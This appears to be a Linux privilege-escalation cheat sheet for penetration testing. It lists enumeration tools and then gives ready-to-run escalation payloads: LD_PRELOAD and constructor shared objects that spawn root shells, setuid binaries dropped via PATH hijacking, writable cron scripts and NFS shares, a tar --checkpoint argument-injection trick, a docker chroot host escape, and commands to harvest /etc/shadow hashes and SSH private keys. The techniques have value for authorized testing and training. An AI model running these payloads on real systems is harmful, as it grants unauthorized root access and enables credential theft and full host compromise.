# Linux Privilege Escalation 

## 1. Enumeration

### Automated scripts

* `linpeas` — comprehensive local enumeration script
* `LinEnum` — enumeration script that gathers system, kernel and config info
* `linux-privilege-suggester` — suggests escalation paths based on findings
* `linuxprivchecker` — quick checks for common misconfigurations


### Sudo checks

* Command: `sudo -l` — list permitted sudo commands for the current user
* Resource: [GTFOBins](https://gtfobins.github.io/) — shows how binaries can be abused

### File search tools

* `dirsearch` (github: maurosoria/dirsearch) — web-content directory brute-forcer (useful when enumerating web roots during engagements)


## 2. Kernel Exploits

Kernel exploits abuse vulnerabilities in the Linux kernel to escalate from an unprivileged user to root

Useful commands:

```
# check current user and group IDs
id

# gather kernel and system information
uname -a
```

* Verify kernel version and search Exploit-DB or other databases for matching public exploits (e.g., Dirty COW: `CVE-2016-5195`).
* **Warning:** Kernel exploits can crash systems. Avoid running them on production systems unless authorised.


## 3. Weak Passwords and Incorrect File Permissions

I. Check for world-readable `/etc/shadow` (should never be readable by non-root). If readable, collect hashes and crack them offline

II. Look for weak file permissions on executables or scripts; combined with `sudo` misconfigurations this can lead to escalation


## 4. Improper Sudo Permissions

* `sudo -l` reveals commands you can run as root or other users
* Search GTFOBins for exploitation techniques for allowed binaries.
* Example vulnerable sudo versions or CVEs may allow bypass (e.g., `sudo 1.8.27` bypasses) — check Exploit-DB

### SSH key escalation

```
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

Look for private keys the user can read and reuse

### LD_PRELOAD abuse (example)

If a vulnerable SUID binary allows `LD_PRELOAD` under sudo, you can inject a shared object.

`shell.c`:

```
#include<stdio.h>
#include<sys/types.h>
#include<stdlib.h>

void _init(){
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

Compile and load:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/shell.so /path/to/vulnerable_binary
```

> Note: Modern sudo and kernels mitigate many `LD_PRELOAD` attacks; verify applicability


## 5. Improper SUID Permissions

SUID allows a binary to run with the file owner’s privileges (often root). A misconfigured SUID binary can be abused to escalate.

Find SUID files:

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Use GTFOBins to check how specific SUID binaries can be abused

### Shared-object injection (SUID `.so` abuse)

* If a SUID binary loads `.so` files from writable locations, you can replace or create malicious `.so` files.
* Use `strace` to see what files a binary opens:

```
strace /path/to/binary 2>&1 | grep -i -E "open|access|no such file"
```

Example malicious `libcalc.c` (constructor runs at load):

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile and place the `.so` where the binary will load it.

### SUID web server / log file issues

* Misconfigured web servers (e.g., nginx) with writable log directories or scripts can be abused.
* Example: check nginx version via package manager:

```
dpkg -l | grep nginx
```

If an exploit exists for that version, follow public exploit instructions


## 6. Environment Variable and PATH Attacks

SUID binaries that call external programs using relative paths or rely on environment variables can be hijacked.

Steps:

1. Create a malicious binary or script in a writable directory (e.g., `/tmp`).
2. Modify `PATH` or export a function so the SUID binary picks up your payload.

Example:

```
# Create payload
echo 'int main(){ setuid(0); setgid(0); system("/bin/bash"); return 0; }' > /tmp/svc.c
gcc /tmp/svc.c -o /tmp/svc
chmod +x /tmp/svc 

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run vulnerable SUID binary that will call 'svc' (example)
/usr/local/bin/suid-env2
```


## 7. Capabilities (file capabilities)

Linux capabilities allow granting limited privileges to binaries without full root via `setcap` and `getcap`.

Find file capabilities:

```
getcap -r / 2>/dev/null
```

If a binary has capabilities that allow `CAP_SETUID` or similar, it may be abused. Common languages/tools with capability-based issues: `tar`, `python`, `openssl`, `perl`.

Example Python escalation (if allowed):

```
import os
os.setuid(0)
os.system('/bin/bash')
```


## 8. Scheduled Tasks (cron / systemd timers)

* Inspect system cron jobs and user crontabs:

```
cat /etc/crontab
crontab -l
ls -la /etc/cron.*
```

* Systemd timers:

```
systemctl list-timers --all
```

### Escalation via writable script referenced by cron

If a cron job runs a script or binary you can write to, replace it with a script that creates a SUID shell:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/writable/script
chmod +x /path/to/writable/script

# Wait for cron to run, then:
/tmp/bash -p
```

### Cron wildcard / argument injection example

Some cron jobs run commands that include user-supplied arguments or use tar. Abuse of `--checkpoint` arguments in tar can be used to make tar execute arbitrary commands:

```
# Example (conceptual):
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > ~/runme.sh
touch ~/--checkpoint=1
touch ~/--checkpoint-action=exec=sh ~/runme.sh

# When tar runs with these arguments, it may execute runme.sh
/tmp/bash -p
```

## 9. NFS: Root Squashing and no_root_squash

* NFS `root_squash` maps root to an unprivileged user on the server (safe default).
* `no_root_squash` allows client root to act as root on the server (dangerous).

Check exports on the server:

```
cat /etc/exports
showmount -e <ip>
```

If you can mount an export with `no_root_squash`, you may be able to compile a setuid binary on the server via the shared mount:

```
mkdir /tmp/mountme
mount -o rw,vers=2 <ip>:/tmp /tmp/mountme

# On the exported share
echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
gcc /tmp/mountme/x.c -o /tmp/mountme/x
chmod +s /tmp/mountme/x

# On victim
cd /tmp
./x
```

## 10. Docker Misconfiguration

If the user is in the `docker` group (can run Docker without sudo) the user effectively has root-equivalent access to the host.

Exploit example:

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

This mounts the host filesystem into the container and `chroot` into it, allowing host-level modifications.


## 11. Resources

* [GTFOBins](https://gtfobins.github.io/)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [Exploit-DB](https://www.exploit-db.com/)